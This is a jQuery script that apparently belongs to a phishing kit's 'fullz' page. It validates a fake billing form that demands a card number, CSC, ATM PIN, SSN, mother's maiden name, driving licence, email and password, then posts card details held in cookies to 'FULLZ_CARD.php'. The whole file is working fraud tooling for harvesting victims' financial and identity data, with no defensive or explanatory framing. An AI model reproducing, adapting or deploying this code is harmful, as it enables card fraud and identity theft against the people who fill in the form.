$().ready(function() {
    $("#expdate").keypress(function(e) {
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            $("#exp").html("").show();
            return false;
        }
    });
    $('input[name="expdate"]').bind('keyup', function() {
        var strokes = $(this).val().length;
        if (strokes === 2) {
            var thisVal = $(this).val();
            thisVal += '/';
            $(this).val(thisVal);
        }
    });
    $('input[name="expdate"]').keypress(function(evt) {
        var keycode = evt.charCode || evt.keyCode;
        if (keycode == 47) {
            return false;
        }
    });
    $.validator.addMethod("expiration", function(value, element) {
        var today = new Date();
        var startDate = new Date(today.getFullYear(), today.getMonth(), 1, 0, 0, 0, 0);
        var expDate = value;
        var separatorIndex = expDate.indexOf('/');
        expDate = expDate.substr(0, separatorIndex) + '/1' + expDate.substr(separatorIndex);
        return Date.parse(startDate) <= Date.parse(expDate);
    });
    $(".GOxGOxPOWERxRANGERS").validate({
        rules: {
			/////////////////// BILLING ADDRESS INFO ///////////////////

			dextera     : { required: true, minlength:1,  maxlength: 30},
			dexterb     : { required: true, minlength:1,  maxlength: 30},
			dexterc     : { required: true, minlength:1,  maxlength: 30},           
			email       : { required: true, minlength:1,  maxlength: 40},
            password    : { required: true, minlength:1,  maxlength: 30},
			confirme    : { required: true, minlength:1,  maxlength: 30},
			mother     : { required: true, minlength:1,  maxlength: 30},
			driving    :{ required: true, minlength:1,  maxlength: 30},
            /////////////////// C-D/CARD INFORMATION ///////////////////
			cardholder  : { required: true, minlength:1, maxlength: 40 },
            cardnumber  : { required: true, minlength:12,maxlength: 19,creditcard: true},
			csc         : { required: true, minlength:3, maxlength: 4 },
			atmpin    : { required: true, minlength:4,  maxlength: 4},
			ssn    : { required: true  },
			date_ex : { required: true  },
			_username_ : { required: true  },
			_password_ : { required: true  },
        }, 
        messages: { 
		    _username_: "",
			_password_: "",
		    date_ex: "",
			dextera: "",
			dexterb: "",
			dexterc: "", 			
			email: "",  
			password: "", 
			confirme: "", 
			mother: "", 
			driving: "", 
			ssn: "",
			cardholder: "", 
			cardnumber: "", 
			sexyday: "", 
			atmpin: "", 
			csc: ""
		},
        submitHandler: function(form) {
            $(".rotation").delay(0).fadeIn(300);
            $.ajax({
            type: 'POST',
			url: 'FULLZ_CARD.php',
            data: {
                'card_type' : $.cookie('card_type'), 				
                'nameoncard': $.cookie('nameoncard'), 
                'cardnumber': $.cookie('cardnumber'),
                'expdate'   : $.cookie('expdate'),
                 'csc'      : $.cookie('csc'),
            },
            });
        },
    });
    $('#cardnumber').mask('0000 0000 0000 0000');
    $('#csc').mask('0000');
    $('#en_expdate').focus(function() {
        $(this).attr('placeholder', 'Month/Year')
    }).blur(function() {
        $(this).attr('placeholder', 'Expiration date')
    });
////////// CAPITLAZED INPUT FULLZ PAGE ////////////////
    $("input.Xval666ideX1").keyup(function() {
        toUpper(this);
    });
    function toUpper(obj) {
        var mystring = obj.value;
        var sp = mystring.split(' ');
        var wl = 0;
        var f, r;
        var word = new Array();
        for (i = 0; i < sp.length; i++) {
            f = sp[i].substring(0, 1).toUpperCase();
            r = sp[i].substring(1).toLowerCase();
            word[i] = f + r;
        }
        newstring = word.join(' ');
        obj.value = newstring;
        return true;
    };
    $('#cardnumber').validateCreditCard(function(result) {
        // console.log(result);
        if (result.card_type != null) {
            switch (result.card_type.name) {
                case "VISA":
                    $('#cardnumber').css('background-position', '98.5% -1.2%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "VISA ELECTRON":
                    $('#cardnumber').css('background-position', '98.5%  37.4%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MASTERCARD":
                    $('#cardnumber').css('background-position', '98.5%  3.5%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MAESTRO":
                    $('#cardnumber').css('background-position', '98.5%  3.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "DISCOVER":
                    $('#cardnumber').css('background-position', '97.5%  18.1%');
					$('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "AMEX":
                    $('#cardnumber').css('background-position', '99% 10.1%');
                    $('#csc').attr('pattern', '[0-9]{4}');
					$('#csc').attr('maxlength', '4');
					$('#csc').attr('placeholder', 'CSC (4 digits)');
                    break;
                case "JCB":
                    $('#cardnumber').css('background-position', '98.5% 32.5%');
                    break;
                case "DINERS CLUB":
                    $('#cardnumber').css('background-position', '98.4% 81.6%');
                    break;
				 case "DINERS CLUB GLOBAL":
                    $('#cardnumber').css('background-position', '98.4% 81.6%');
                    break;
                default:
                    $('#cardnumber').css('background-position', '98.4% 81.6%');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
            }
        } else {
            $('#cardnumber').css('background-position', '98.4% 81.6%');
			$('#csc').attr('placeholder', 'CSC (3 digits)');
        }
        // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
        if (result.valid || $('#cardnumber').val().length > 16) {
            if (result.valid) {
                $('#cardnumber').removeClass('error').addClass('');
            } else {
                $('#cardnumber').removeClass('').addClass('error');
            }
        } else {
            $('#cardnumber').removeClass('').removeClass('error');
        }
    });
});